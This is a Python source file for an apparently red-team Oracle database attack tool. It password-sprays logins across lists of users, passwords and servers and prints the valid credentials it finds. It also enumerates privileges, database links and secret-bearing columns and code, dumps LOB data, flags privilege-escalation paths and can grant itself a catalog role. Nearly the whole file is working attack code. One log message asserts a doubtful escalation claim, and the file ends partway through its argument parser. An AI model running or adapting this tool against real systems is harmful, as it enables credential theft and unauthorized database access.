import argparse
import getpass
import itertools
import json
import logging
import re
import sys
import time
from pathlib import Path
from typing import Iterable, List, Tuple

try:
    import cx_Oracle as oradb
except ImportError:
    print("Error: The 'oracledb' (formerly cx_Oracle) package is required. Please install it with 'pip install oracledb'", file=sys.stderr)
    sys.exit(1)

try:
    import pandas as pd
except ImportError:
    print("Error: The 'pandas' package is required. Please install it with 'pip install pandas'", file=sys.stderr)
    sys.exit(1)


###############################################################################
# ----------------------------- Helper utilities ----------------------------- #
###############################################################################

PREFIX_ORDER = ("DBA_", "ALL_", "USER_")
DEFAULT_SENSITIVE_TERMS = "password,passwd,secret,key,token,ssn,pii,credit,card,cvv"
HIGH_IMPACT_SYS_PRIVS = {
    "CREATE ANY PROCEDURE": "Can create a procedure in another schema with definer's rights to escalate.",
    "EXECUTE ANY PROCEDURE": "Can execute potentially vulnerable procedures (e.g., with AUTHID DEFINER).",
    "GRANT ANY ROLE": "Can grant self DBA or other powerful roles.",
    "GRANT ANY PRIVILEGE": "Can grant self any system privilege.",
    "ALTER ANY TABLE": "Can add triggers to tables owned by privileged users like SYS.",
    "BECOME USER": "Can impersonate any other user, including SYS or SYSTEM.",
    "CREATE ANY TRIGGER": "Can create triggers that fire with definer's rights on table events.",
    "SELECT ANY DICTIONARY": "Can read sensitive data dictionary views, potentially exposing weaknesses.",
}
HIGH_IMPACT_OBJ_PRIVS = {
    "UTL_FILE": ("EXECUTE", "Can read from and write to arbitrary files on the database server filesystem."),
    "DBMS_SCHEDULER": ("EXECUTE", "Can run external OS commands or scripts as the Oracle user."),
    "DBMS_BACKUP_RESTORE": ("EXECUTE", "Can execute privileged file system operations on the server."),
    "DBMS_LDAP": ("EXECUTE", "Can interact with LDAP to authenticate, exfiltrate data, or modify directories."),
}

def split_csv(raw: str | None) -> List[str]:
    return [s.strip() for s in raw.split(",")] if raw else []

def read_file_lines(filepath: str | None) -> List[str]:
    if not filepath: return []
    try:
        return [line.strip() for line in Path(filepath).read_text().splitlines() if line.strip()]
    except FileNotFoundError:
        logging.error("File not found: %s", filepath)
        sys.exit(1)

def _build_like_clause(column: str, terms: List[str]) -> str:
    if not terms: return "1=0"
    conditions = [f"UPPER({column}) LIKE '%{term.upper()}%'" for term in terms]
    return f"({' OR '.join(conditions)})"

###############################################################################
# ------------------------ Credential Generation ---------------------------- #
###############################################################################

def generate_login_combos(args) -> List[Tuple[str, str, str]]:
    """Generates a list of (user, pass, dsn) tuples for either spray or static modes."""
    # Spraying Mode
    is_spray_mode = args.users_file or args.login_user
    if is_spray_mode:
        logging.info("Running in Password Spraying Mode.")
        users = read_file_lines(args.users_file) or ([args.login_user] if args.login_user else [])
        passwords = read_file_lines(args.pass_file) or ([args.login_pass] if args.login_pass else [])
        dsns = split_csv(args.dsn_list)

        if not all([users, passwords, dsns]):
            logging.error("For spraying, you must provide users, passwords, and DSNs.")
            logging.error("Use --users-file/--login-user, --pass-file/--login-pass, and -D/--dsn-list.")
            sys.exit(1)

        logging.info("Loaded %d users, %d passwords, %d DSNs. Total attempts: %d",
                     len(users), len(passwords), len(dsns), len(users) * len(passwords) * len(dsns))
        return list(itertools.product(users, passwords, dsns))

    # Static/Enum Mode
    creds = []

    c_list = []
    if args.c: c_list.append(args.c)
    if args.C: c_list.extend(split_csv(args.C))
    if args.creds_file: c_list.extend(read_file_lines(args.creds_file))

    d_list = split_csv(args.dsn_list)
    if not c_list:
        logging.error("No credentials provided for enumeration or query mode. Use -c, -C, or --creds-file.")
        sys.exit(1)

    for idx, tok in enumerate(c_list):
        user, pw, dsn = None, None, None
        user_pw_part = tok
        if '@' in tok:
            parts = tok.rsplit('@', 1)
            user_pw_part, dsn = parts[0], parts[1]

        if ':' in user_pw_part:
            user, pw = user_pw_part.split(':', 1)
        else:
            user = user_pw_part

        if not user:
             logging.error("Bad credential format: '%s'. Could not parse username.", tok)
             continue

        if pw is None:
            if args.ask_pass:
                pw = getpass.getpass(f"Enter password for {user}@{dsn or '...'}: ")
            else:
                logging.error("Password missing for '%s'. Use 'user:pw' format or provide -P/--ask-pass.", tok)
                sys.exit(1)

        # Corrected DSN assignment logic
        if not dsn:
            if len(d_list) == 1:
                dsn = d_list[0]
            elif idx < len(d_list):
                dsn = d_list[idx]
            else:
                logging.error("Missing DSN for credential '%s'. Provide it via @dsn or with -d/-D/--dsn-file.", tok)
                sys.exit(1)
        creds.append((user, pw, dsn))
    return creds

###############################################################################
# ----------------------- SQL & Enumeration Logic ---------------------------- #
###############################################################################

def _build_sensitive_source_query(prefix: str, search_terms: List[str], noise_filter: str) -> str:
    """Builds the SQL to find sensitive keywords in source code with context."""
    like_clause = _build_like_clause('s.text', search_terms)
    return f"""
    WITH source_with_context AS (
      SELECT
        owner, name, type, line, text,
        LAG(text, 3) OVER (PARTITION BY owner, name, type ORDER BY line) as prev_line_3,
        LAG(text, 2) OVER (PARTITION BY owner, name, type ORDER BY line) as prev_line_2,
        LAG(text, 1) OVER (PARTITION BY owner, name, type ORDER BY line) as prev_line_1,
        LEAD(text, 1) OVER (PARTITION BY owner, name, type ORDER BY line) as next_line_1,
        LEAD(text, 2) OVER (PARTITION BY owner, name, type ORDER BY line) as next_line_2,
        LEAD(text, 3) OVER (PARTITION BY owner, name, type ORDER BY line) as next_line_3
      FROM {prefix}SOURCE s
      WHERE name IN (SELECT name FROM {prefix}SOURCE s WHERE {like_clause} {noise_filter})
    )
    SELECT
      owner, name, type, line,
      prev_line_3, prev_line_2, prev_line_1,
      text as matched_line,
      next_line_1, next_line_2, next_line_3
    FROM source_with_context
    WHERE {_build_like_clause('text', search_terms)}
    ORDER BY owner, name, line
    """

def process_query_results(cur, dump_lobs: bool, outdir: Path, stem: str) -> pd.DataFrame:
    """
    Fetches data from an executed cursor, handles LOBs, and returns a DataFrame.
    If dump_lobs is True, BLOB/CLOB data is saved to files. Otherwise, a placeholder is used.
    """
    if not cur.description:
        return pd.DataFrame()

    cols = [d[0] for d in cur.description]
    col_types = [d[1] for d in cur.description]
    
    lob_indices = {
        i for i, t in enumerate(col_types) 
        if t in (oradb.DB_TYPE_BLOB, oradb.DB_TYPE_CLOB)
    }

    if not lob_indices:
        return pd.DataFrame(cur.fetchall(), columns=cols)

    logging.info("LOB columns detected: %s", ", ".join(cols[i] for i in lob_indices))
    
    processed_rows = []
    lob_dir = outdir / "lobs"
    if dump_lobs:
        lob_dir.mkdir(parents=True, exist_ok=True)
        logging.info("Dumping LOB content to directory: %s", lob_dir)

    for i, row in enumerate(cur):
        processed_row = list(row)
        for j in lob_indices:
            lob = processed_row[j]
            if lob is None or not hasattr(lob, 'read'):
                continue

            try:
                lob_size = lob.size()
                is_clob = col_types[j] == oradb.DB_TYPE_CLOB
                
                if dump_lobs:
                    ext = "txt" if is_clob else "dat"
                    filename = f"{stem}_r{i+1}_{cols[j]}.{ext}"
                    filepath = lob_dir / filename
                    
                    content = lob.read()
                    if is_clob:
                        with open(filepath, "w", encoding="utf-8") as f:
                            f.write(content)
                    else:
                        with open(filepath, "wb") as f:
                            f.write(content)
                    
                    processed_row[j] = f"[LOB saved to: lobs/{filename}]"
                else:
                    lob_type_str = "CLOB" if is_clob else "BLOB"
                    processed_row[j] = f"[{lob_type_str}, Size: {lob_size} bytes]"

            except oradb.DatabaseError as e:
                logging.warning("Could not read LOB at row %d, column %s: %s", i + 1, cols[j], e)
                processed_row[j] = "[LOB Read Error]"
            except Exception as e:
                logging.error("Unexpected error processing LOB at row %d, column %s: %s", i + 1, cols[j], e, exc_info=True)
                processed_row[j] = "[LOB Processing Error]"
        
        processed_rows.append(processed_row)

    return pd.DataFrame(processed_rows, columns=cols)

def build_sqls(prefix: str, categories: List[str], search_terms: List[str]) -> dict[str, str]:
    """Generates SQL queries based on the determined privilege scope."""
    p = prefix
    sql = {}
    noise_filter = "AND owner NOT IN ('SYS', 'SYSTEM', 'ORDSYS', 'MDSYS', 'CTXSYS', 'XDB', 'DBSNMP', 'ORDDATA', 'OLAPSYS', 'WMSYS', 'EXFSYS', 'APPQOSSYS', 'DVSYS', 'AUDSYS')"

    def get_user_priv_queries(cats: List[str]) -> dict[str, str]:
        user_sql = {}
        if "roles" in cats: user_sql["roles"] = "SELECT USER as owner, granted_role, admin_option, delegate_option, default_role FROM USER_ROLE_PRIVS ORDER BY granted_role"
        if "sys" in cats: user_sql["sys"] = """SELECT USER as owner, privilege, admin_option, 'DIRECT' AS granted_through FROM USER_SYS_PRIVS UNION ALL SELECT USER as owner, rsp.privilege, rsp.admin_option, urp.granted_role AS granted_through FROM ROLE_SYS_PRIVS rsp JOIN USER_ROLE_PRIVS urp ON rsp.role = urp.granted_role ORDER BY privilege"""
        if "profile" in cats: user_sql["profile"] = "SELECT USER as owner, username, user_id, account_status, created, profile FROM USER_USERS"
        if "quotas" in cats: user_sql["quotas"] = "SELECT USER as owner, tablespace_name, bytes, max_bytes, blocks, max_blocks FROM USER_TS_QUOTAS"
        return user_sql

    if p == 'DBA_':
        if "roles" in categories: sql["roles"] = "SELECT * FROM DBA_ROLE_PRIVS WHERE grantee = :bind_user ORDER BY granted_role"
        if "sys" in categories: sql["sys"] = "SELECT privilege, admin_option, grantee AS granted_to FROM DBA_SYS_PRIVS WHERE grantee = :bind_user UNION ALL SELECT p.privilege, p.admin_option, r.grantee FROM DBA_SYS_PRIVS p JOIN DBA_ROLE_PRIVS r ON r.granted_role = p.grantee WHERE r.grantee = :bind_user ORDER BY privilege"
        if "obj" in categories: sql["obj"] = "SELECT owner, table_name, privilege, grantable, grantor, grantee FROM DBA_TAB_PRIVS WHERE grantee = :bind_user UNION ALL SELECT t.owner, t.table_name, t.privilege, t.grantable, t.grantor, r.grantee FROM DBA_TAB_PRIVS t JOIN DBA_ROLE_PRIVS r ON r.granted_role = t.grantee WHERE r.grantee = :bind_user ORDER BY owner, table_name, privilege"
        if "col" in categories: sql["col"] = "SELECT owner, table_name, column_name, privilege, grantable, grantor, grantee FROM DBA_COL_PRIVS WHERE grantee = :bind_user UNION ALL SELECT c.owner, c.table_name, c.column_name, c.privilege, c.grantable, c.grantor, r.grantee FROM DBA_COL_PRIVS c JOIN DBA_ROLE_PRIVS r ON r.granted_role = c.grantee WHERE r.grantee = :bind_user ORDER BY owner, table_name, column_name, privilege"
        if "profile" in categories: sql["profile"] = "SELECT * FROM DBA_USERS WHERE username = :bind_user"
        if "quotas" in categories: sql["quotas"] = "SELECT * FROM DBA_TS_QUOTAS WHERE username = :bind_user"
        if "dblinks" in categories: sql["dblinks"] = "SELECT owner, db_link, username, host, created FROM DBA_DB_LINKS ORDER BY owner, db_link"
        if "schemas" in categories: sql["schemas"] = f"SELECT owner, table_name, num_rows FROM DBA_TABLES WHERE owner IS NOT NULL {noise_filter} ORDER BY owner, table_name"
        if "sensitive" in categories:
            sql["sensitive_columns"] = f"SELECT owner, table_name, column_name FROM DBA_TAB_COLUMNS WHERE {_build_like_clause('column_name', search_terms)} {noise_filter} ORDER BY owner, table_name"
            sql["sensitive_source_context"] = _build_sensitive_source_query(p, search_terms, noise_filter)
        return sql
    elif p == 'ALL_':
        sql = get_user_priv_queries(categories)
        if "obj" in categories: sql["obj"] = "SELECT owner, table_name, privilege, grantable, grantor, grantee FROM ALL_TAB_PRIVS WHERE grantee = :bind_user ORDER BY owner, table_name, privilege"
        if "col" in categories: sql["col"] = "SELECT owner, table_name, column_name, privilege, grantable, grantor, grantee FROM ALL_COL_PRIVS WHERE grantee = :bind_user ORDER BY owner, table_name, column_name, privilege"
        if "dblinks" in categories: sql["dblinks"] = "SELECT owner, db_link, username, host, created FROM ALL_DB_LINKS ORDER BY owner, db_link"
        if "schemas" in categories: sql["schemas"] = "SELECT owner, table_name, num_rows FROM ALL_TABLES ORDER BY owner, table_name"
        if "sensitive" in categories:
            sql["sensitive_columns"] = f"SELECT owner, table_name, column_name FROM ALL_TAB_COLUMNS WHERE {_build_like_clause('column_name', search_terms)} ORDER BY owner, table_name"
            sql["sensitive_source_context"] = _build_sensitive_source_query(p, search_terms, "")
        return sql
    elif p == 'USER_':
        sql = get_user_priv_queries(categories)
        if "obj" in categories: sql["obj"] = "SELECT USER as owner, table_name, privilege, grantable, grantor, grantee FROM USER_TAB_PRIVS ORDER BY grantee, table_name, privilege"
        if "col" in categories: sql["col"] = "SELECT USER as owner, table_name, column_name, privilege, grantable, grantor, grantee FROM USER_COL_PRIVS ORDER BY grantee, table_name, column_name, privilege"
        if "dblinks" in categories: sql["dblinks"] = "SELECT USER as owner, db_link, username, host, created FROM USER_DB_LINKS ORDER BY db_link"
        if "schemas" in categories: sql["schemas"] = "SELECT USER as owner, table_name, num_rows FROM USER_TABLES ORDER BY table_name"
        if "sensitive" in categories:
            sql["sensitive_columns"] = f"SELECT USER as owner, table_name, column_name FROM USER_TAB_COLUMNS WHERE {_build_like_clause('column_name', search_terms)} ORDER BY table_name"
            sql["sensitive_source_context"] = _build_sensitive_source_query(p, search_terms, "")
        return sql
    return sql

def fetch_frames(cur, stmts: dict[str, str], user: str, dump_lobs: bool, outdir: Path, base_stem: str) -> dict[str, pd.DataFrame]:
    dfs = {}
    query_count = len(stmts)
    if query_count == 0:
        logging.warning("No queries generated for the selected categories and scope.")
        return {}

    logging.info("Executing %d queries for target user '%s'...", query_count, user)
    for name, sql in stmts.items():
        logging.info("Running query for '%s': %s", name, sql)
        bind_vars = {'bind_user': user} if ':bind_user' in sql else {}
        try:
            cur.execute(sql, bind_vars)
            
            if cur.description:
                query_stem = f"{base_stem}_{name}"
                df = process_query_results(cur, dump_lobs, outdir, query_stem)
            else:
                df = pd.DataFrame()

            if name == "sensitive_source_context":
                for col in df.columns:
                    if "line" in col and df[col].dtype == 'object':
                        df[col] = df[col].str.replace('\n', '', regex=False).str.strip()
            dfs[name] = df
            logging.debug("Query '%s' returned %d rows.", name, len(dfs[name]))
        except oradb.DatabaseError as exc:
            logging.warning("Failed to run query for '%s': %s", name, exc)
            dfs[name] = pd.DataFrame()
    logging.info("Finished executing queries for '%s'.", user)
    return dfs

def write_excel(dfs, path: Path):
    with pd.ExcelWriter(path) as xl:
        for name, df in dfs.items():
            if not df.empty: df.to_excel(xl, sheet_name=name[:31], index=False)

def write_csvs(dfs, stem: str, outdir: Path):
    for name, df in dfs.items():
        if not df.empty: df.to_csv(outdir / f"{stem}_{name}.csv", index=False)

def write_json(dfs, path: Path):
    merged = {k: df.to_dict(orient="records") for k, df in dfs.items() if not df.empty}
    path.write_text(json.dumps(merged, indent=2, default=str), encoding="utf-8")

def dump_outputs(dfs, stem: str, outdir: Path, formats: Iterable[str]):
    outdir.mkdir(parents=True, exist_ok=True)
    if "excel" in formats: write_excel(dfs, outdir / f"{stem}.xlsx")
    if "csv" in formats: write_csvs(dfs, stem, outdir)
    if "json" in formats: write_json(dfs, outdir / f"{stem}.json")

###############################################################################
# ----------------------- Main Logic Controllers ----------------------------- #
###############################################################################

def pick_prefix(cur, scope_arg: str) -> str:
    """
    Determines the best accessible data dictionary prefix (DBA_, ALL_, USER_).
    """
    if scope_arg != "auto":
        prefix = f"{scope_arg.upper()}_"
        logging.info("User forced scope to '%s'.", prefix)
        return prefix

    logging.info("Automatically detecting best view prefix...")
    for prefix in PREFIX_ORDER:
        test_view = f"{prefix}TABLES"
        try:
            cur.execute(f"SELECT 1 FROM {test_view} WHERE 1=0")
            logging.info("Successfully queried from '%s'. Using '%s' prefix for enumeration.", test_view, prefix)
            return prefix
        except oradb.DatabaseError as e:
            err, = e.args
            if err.code == 942:  # ORA-00942: table or view does not exist
                logging.debug("Prefix test failed for '%s': view not accessible.", prefix)
                continue
            else:
                logging.warning("Unexpected DB error while testing prefix '%s': %s", prefix, e)
    logging.error("Could not access any standard dictionary views (DBA_, ALL_, USER_). Cannot proceed.")
    return ""

def handle_direct_query(creds, args):
    query = args.query.strip()
    is_select = query.upper().startswith('SELECT')
    if not is_select and not args.force:
        logging.error("Query does not start with SELECT. Use --force to run DML/DDL statements.")
        return

    mode = oradb.SYSDBA if args.as_sysdba else oradb.DEFAULT_AUTH
    fmts = split_csv(args.output.lower())
    outdir = Path(args.outdir)

    for user, pw, dsn in creds:
        print(f"\n[OPSEC] About to execute the following query on {user}@{dsn}:")
        print(f"    SQL: {query}")
        try:
            if not sys.stdout.isatty():
                print("Non-interactive session detected. Aborting to prevent unintended actions.")
                logging.warning("Non-interactive session. Aborting query for '%s@%s'.", user, dsn)
                continue
            confirm = input(f"    > Do you want to proceed with this connection? (y/N): ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            print("\nConfirmation cancelled. Aborting execution.")
            logging.warning("Execution cancelled by user for '%s@%s'.", user, dsn)
            sys.exit(0)

        if confirm != 'y':
            logging.warning("Execution cancelled by user for '%s@%s'. Skipping.", user, dsn)
            continue

        print(f"\n---[ Executing query on {user}@{dsn} (Mode: {'SYSDBA' if args.as_sysdba else 'Normal'}) ]---")
        try:
            with oradb.connect(user=user, password=pw, dsn=dsn, mode=mode) as conn:
                with conn.cursor() as cur:
                    cur.execute(query)
                    if cur.description:
                        stem = ""
                        if args.log_file:
                            stem = Path(args.log_file).stem
                        else:
                            safe_dsn = dsn.replace(':', '-').replace('/', '_').replace('@', '_')
                            stem = f"query_{user.upper()}_{safe_dsn}"
                        
                        df = process_query_results(cur, args.dump_lobs, outdir, stem)
                        print(df.to_string() if not df.empty else "(Query returned no rows)")

                        if not df.empty and any(f in fmts for f in ["excel", "csv", "json"]):
                            dfs_to_dump = {'query_result': df}
                            dump_outputs(dfs_to_dump, stem, outdir, fmts)
                            logging.info(f"Query results for {user}@{dsn} saved. See files starting with '{stem}' in '{outdir}'.")
                    else:
                        logging.info("Query executed successfully. %d rows affected.", cur.rowcount)
                        if not is_select:
                            conn.commit()
                            logging.info("Transaction committed.")
        except oradb.DatabaseError as exc:
            err, = exc.args
            logging.error("Direct query execution failed.")
            logging.error("--- Attempted SQL ---")
            logging.error(query)
            logging.error("--- Database Response ---")
            logging.error("%s (Code: %s)", err.message.strip(), err.code)
            if err.code == 942:
                logging.error("Hint: This error means the table/view does not exist or the connected user lacks privileges.")
                logging.error("      Consider using views with 'ALL_' or 'USER_' prefixes if not using a DBA account.")
            elif err.code == 900:
                logging.error("Hint: The SQL statement is invalid. This can happen with client-specific commands (e.g., from SQL*Plus) that are not standard SQL.")

def handle_interactive_query(creds, args):
    """Starts an interactive SQL shell for a single connection."""
    if not creds:
        logging.error("Interactive mode requires at least one credential.")
        return

    if len(creds) > 1:
        logging.warning("Multiple credentials provided. Using the first one for the interactive session: %s", creds[0])

    user, pw, dsn = creds[0]
    mode = oradb.SYSDBA if args.as_sysdba else oradb.DEFAULT_AUTH
    outdir = Path(args.outdir)

    print(f"\n[OPSEC] About to start an interactive session for {user}@{dsn}")
    try:
        if not sys.stdout.isatty():
            print("Non-interactive session detected. Aborting to prevent unintended actions.")
            logging.warning("Non-interactive session. Aborting interactive mode for '%s@%s'.", user, dsn)
            return
        confirm = input(f"    > Do you want to proceed? (y/N): ").strip().lower()
    except (EOFError, KeyboardInterrupt):
        print("\nConfirmation cancelled. Aborting execution.")
        logging.warning("Execution cancelled by user for '%s@%s'.", user, dsn)
        return

    if confirm != 'y':
        logging.warning("Execution cancelled by user for '%s@%s'.", user, dsn)
        return

    print(f"---[ Starting Interactive SQL Session for {user}@{dsn} (Mode: {'SYSDBA' if args.as_sysdba else 'Normal'}) ]---")
    print("Type multi-line queries ending with a ';'. Type 'exit' or 'quit' to end the session.")
    print("Supported client commands: show con_name, show pdbs")

    try:
        with oradb.connect(user=user, password=pw, dsn=dsn, mode=mode) as conn:
            logging.info("Successfully connected to %s.", dsn)
            print(f"Connected to: {conn.version}")

            while True:
                sql_lines = []
                try:
                    prompt = f"{user}@{dsn.split('/')[-1]}> "
                    line = input(prompt)
                    sql_lines.append(line)
                    
                    while not line.strip().endswith(';'):
                        line = input("... ")
                        sql_lines.append(line)
                    
                    full_input = "\n".join(sql_lines).strip()
                    
                    sql_query = full_input[:-1].strip() if full_input.endswith(';') else full_input.strip()

                    if not sql_query:
                        continue
                    
                    normalized_query = sql_query.lower()
                    if normalized_query in ('exit', 'quit'):
                        break

                    if normalized_query == 'commit':
                        conn.commit()
                        print("Commit complete.")
                        continue
                    if normalized_query == 'rollback':
                        conn.rollback()
                        print("Rollback complete.")
                        continue

                    # Emulate common SQL*Plus SHOW commands
                    if normalized_query == 'show con_name':
                        sql_query = "SELECT SYS_CONTEXT('USERENV', 'CON_NAME') AS CON_NAME FROM DUAL"
                    elif normalized_query == 'show pdbs':
                        sql_query = "SELECT PDB_ID, PDB_NAME, STATUS FROM V$PDBS"

                    is_select = sql_query.lstrip().upper().startswith('SELECT')

                    with conn.cursor() as cur:
                        cur.execute(sql_query)
                        if cur.description:
                            timestamp = time.strftime("%H%M%S")
                            safe_dsn = dsn.replace(':', '-').replace('/', '_').replace('@', '_')
                            stem = f"interactive_{user.upper()}_{safe_dsn}_{timestamp}"
                            df = process_query_results(cur, args.dump_lobs, outdir, stem)
                            print(df.to_string() if not df.empty else "(Query returned no rows)")
                        else:
                            print(f"Query OK, {cur.rowcount} rows affected.")
                            if not is_select:
                                print("Use 'COMMIT' or 'ROLLBACK' to finalize the transaction.")

                except oradb.DatabaseError as e:
                    err, = e.args
                    print(f"Database Error: {err.message.strip()}", file=sys.stderr)
                    if err.code == 942: # ORA-00942: table or view does not exist
                        print("Hint: This error means the table or view does not exist or you don't have privileges to see it.", file=sys.stderr)
                        print("      If not connected as a privileged user, try 'ALL_' or 'USER_' prefixed views instead of 'DBA_'.", file=sys.stderr)
                        print("      Example: SELECT * FROM ALL_TABLES instead of SELECT * FROM DBA_TABLES.", file=sys.stderr)
                    elif err.code == 900: # ORA-00900: invalid SQL statement
                        print("Hint: The SQL statement is not valid. This interactive shell only supports standard SQL and a few client commands (show con_name, show pdbs).", file=sys.stderr)

                except (EOFError, KeyboardInterrupt):
                    print("\nExiting interactive session.")
                    break
    
    except oradb.DatabaseError as e:
        err, = e.args
        logging.error("Failed to connect to the database for interactive session for %s@%s.", user, dsn)
        logging.error("%s (Code: %s)", err.message.strip(), err.code)
    except Exception as e:
        logging.error("An unexpected error occurred during the interactive session: %s", e)

    print("---[ Session Ended ]---")


def handle_spraying(creds, args):
    successes = []
    mode = oradb.SYSDBA if args.as_sysdba else oradb.DEFAULT_AUTH
    for user, pw, dsn in creds:
        try:
            logging.debug("Attempting -> %s:%s@%s", user, '********', dsn)
            with oradb.connect(user=user, password=pw, dsn=dsn, mode=mode):
                success_str = f"[+] SUCCESS: {user}:{pw}@{dsn} (Mode: {'SYSDBA' if args.as_sysdba else 'Normal'})"
                logging.critical(success_str)
                successes.append(success_str)
        except oradb.DatabaseError as exc:
            err, = exc.args
            if err.code == 1017: # ORA-01017: invalid username/password
                logging.debug("Failed login for %s@%s (ORA-01017)", user, dsn)
            else:
                logging.warning("DB Error for %s@%s: %s", user, dsn, str(err.message).strip())
        except Exception as exc:
            logging.error("Critical error for %s@%s: %s", user, dsn, exc)
        finally:
            time.sleep(0.1)

    if successes:
        print("\n--- Valid Credentials Found ---")
        for s in successes: print(s)
    else:
        print("\n--- No valid credentials found ---")

def handle_enumeration(creds, args):
    """Handles the main enumeration logic, including the new OPSEC confirmation prompt."""
    targets = split_csv(args.T) if args.T else ([args.t] if args.t else [])
    cats = split_csv(args.include.lower())
    fmts = split_csv(args.output.lower())
    search_terms = split_csv(args.search_terms.lower()) or split_csv(DEFAULT_SENSITIVE_TERMS)
    outdir = Path(args.outdir)
    mode = oradb.SYSDBA if args.as_sysdba else oradb.DEFAULT_AUTH

    for user, pw, dsn in creds:
        logging.info("--- Starting enumeration for login user %s@%s (Mode: %s) ---", user, dsn, 'SYSDBA' if args.as_sysdba else 'Normal')
        try:
            with oradb.connect(user=user, password=pw, dsn=dsn, mode=mode) as conn:
                with conn.cursor() as cur:
                    if args.grant_catalog_role:
                        logging.warning("OPSEC: --grant-catalog-role is a highly audited DDL action.")
                        target_for_grant = (targets[0] if targets else user).upper()
                        
                        print(f"\n[OPSEC] Attempting to grant SELECT_CATALOG_ROLE to '{target_for_grant}'.")
                        try:
                            if not sys.stdout.isatty():
                                print("Non-interactive session detected. Aborting grant operation.")
                                logging.warning("Non-interactive session. Aborting grant for '%s'.", target_for_grant)
                            else:
                                confirm = input(f"    > This is a DDL operation. Proceed? (y/N): ").strip().lower()
                                if confirm == 'y':
                                    try:
                                        grant_sql = f"GRANT SELECT_CATALOG_ROLE TO {target_for_grant}"
                                        logging.info("Executing: %s", grant_sql)
                                        cur.execute(grant_sql)
                                        conn.commit() 
                                        logging.critical(f"Successfully granted SELECT_CATALOG_ROLE to {target_for_grant}.")
                                        logging.critical('*** This usually means you can grant yourself DBA role ***')
                                        logging.info("Re-running scope detection with new privileges...")
                                        prefix = pick_prefix(cur, "auto")
                                    except oradb.DatabaseError as e:
                                        err, = e.args
                                        logging.error("Failed to grant role: %s (Code: %s)", err.message.strip(), err.code)
                                        logging.warning("Continuing enumeration with existing privileges.")
                                else:
                                    logging.warning("Grant operation aborted by user.")
                        except (EOFError, KeyboardInterrupt):
                            print("\nConfirmation cancelled. Aborting execution.")
                            logging.warning("Grant operation cancelled by user.")
                            sys.exit(0)

                    prefix = pick_prefix(cur, args.scope)
                    if not prefix:
                        logging.error("Halting enumeration for %s@%s due to lack of view access.", user, dsn)
                        continue

                    enum_targets = targets or [user]
                    if prefix != "DBA_" and (targets and set(t.upper() for t in targets) != {user.upper()}):
                        logging.warning("Non-DBA scope ('%s') detected. Can only enum logged-in user ('%s').", prefix.strip('_'), user)
                        enum_targets = [user]

                    for tgt_user in enum_targets:
                        logging.info("Preparing to enumerate data for target user: %s", tgt_user.upper())
                        sqls = build_sqls(prefix, cats, search_terms)

                        if not sqls:
                            logging.warning("No SQL queries generated for target '%s'. Skipping.", tgt_user)
                            continue

                        print(f"\n[OPSEC] About to execute {len(sqls)} SQL statement(s) for target '{tgt_user.upper()}' on {dsn}.")
                        try:
                            sys.stdout.flush()
                            if not sys.stdout.isatty():
                                print("Non-interactive session detected. Aborting to prevent unintended scans.")
                                logging.warning("Non-interactive session. Aborting enumeration for '%s'.", tgt_user)
                                continue
                            confirm = input("    > Do you want to proceed? (y/N): ").strip().lower()
                        except (EOFError, KeyboardInterrupt):
                            print("\nConfirmation cancelled. Aborting execution.")
                            logging.warning("Execution cancelled by user for target '%s'.", tgt_user)
                            sys.exit(0)

                        if confirm != 'y':
                            logging.warning("Execution cancelled by user for target '%s'. Skipping.", tgt_user)
                            continue
                        
                        safe_dsn = dsn.replace(':', '-').replace('/', '_').replace('@', '_')
                        stem = f"{tgt_user.upper()}_{safe_dsn}"
                        dfs = fetch_frames(cur, sqls, tgt_user.upper(), args.dump_lobs, outdir, stem)
                        if not dfs: continue
                        analyze_for_privesc(dfs)
                        dump_outputs(dfs, stem, outdir, fmts)
        except oradb.DatabaseError as exc:
            err, = exc.args
            logging.error("Oracle DB error for %s@%s: %s (Code: %s)", user, dsn, err.message.strip(), err.code)
        except Exception as exc:
            logging.error("Critical failure for %s@%s: %s", user, dsn, exc)

def analyze_for_privesc(dfs):
    """Analyzes collected dataframes for known high-impact privs for quick wins."""
    logging.info("Analyzing collected privileges for quick wins...")
    if "sys" in dfs and not dfs["sys"].empty:
        user_privs = set(dfs["sys"]["PRIVILEGE"].str.upper())
        for priv, desc in HIGH_IMPACT_SYS_PRIVS.items():
            if priv in user_privs:
                logging.critical("[PRIVESC] High-impact system privilege found: %s - %s", priv, desc)

    if "obj" in dfs and not dfs["obj"].empty:
        df_obj = dfs["obj"]
        exec_privs = df_obj[df_obj["PRIVILEGE"].str.upper() == "EXECUTE"]
        for obj_name, (priv, desc) in HIGH_IMPACT_OBJ_PRIVS.items():
            if not exec_privs[exec_privs["TABLE_NAME"].str.upper() == obj_name].empty:
                logging.critical("[PRIVESC] High-impact object privilege found: EXECUTE on %s - %s", obj_name, desc)

###############################################################################
# ---------------------------- CLI & main driver ---------------------------- #
###############################################################################

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="Advanced Oracle Enumerator & Sprayer for Red Teams.", formatter_class=argparse.RawTextHelpFormatter)
    cred_group = p.add_argument_group("Credential & Connection (for Enum/Query Modes)")
    cred_group.add_argument("-C", metavar="list", help="Comma-separated list: user[:pw][@dsn],...")
    cred_group.add_argument("-c", metavar="pair", help="Single credential: user[:pw]")
    cred_group.add_argument("--creds-file", help="File with one credential per line (user[:pw][@dsn]).")
    cred_group.add_argument("-P", "--ask-pass", action="store_true", help="Prompt for passwords interactively.")
    cred_group.add_argument("--as-sysdba", action="store_true", help="Connect with SYSDBA privilege. OPSEC WARNING: This is highly audited.")
    spray_group = p.add_argument_group("Password Spraying Mode")
    spray_group.add_argument("--users-file", help="File with one username per line.")
    spray_group.add_argument("--pass-file", help="File with one password per line.")
    spray_group.add_argument("--login-user", help="Single username for spraying.")
    spray_group.add_argument("--login-pass", help="Single password for spraying.")
    dsn_group = p.add_argument_group("DSN Management (All Modes)")
    dsn_group.add_argument("-D", "--dsn-list", metavar="list", help="Comma-separated DSN list (e.g., host/svc,host2/svc2)")
    dsn_group.add_argument("-d", "--dsn", metavar="dsn", help="Single DSN (shortcut for -D)")
    dsn_group.add_argument("--dsn-file", help="File with one DSN per line.")
    enum_group = p.add_argument_group("Enumeration Mode")
    enum_group.add_argument("-T", metavar="list", help="Target users to enumerate (comma-separated)")
    enum_group.add_argument("-t", metavar="name", help="Single target user to enumerate")
    enum_group.add_argument("-s", "--scope", choices=("dba", "all", "user", "auto"), default="auto", help="View prefix to use. Default: auto")
    enum_group.add_argument("-k", "--include", default="roles,sys,obj,schemas", help="Categories: roles,sys,obj,col,quotas,profile,dblinks,sensitive,schemas")
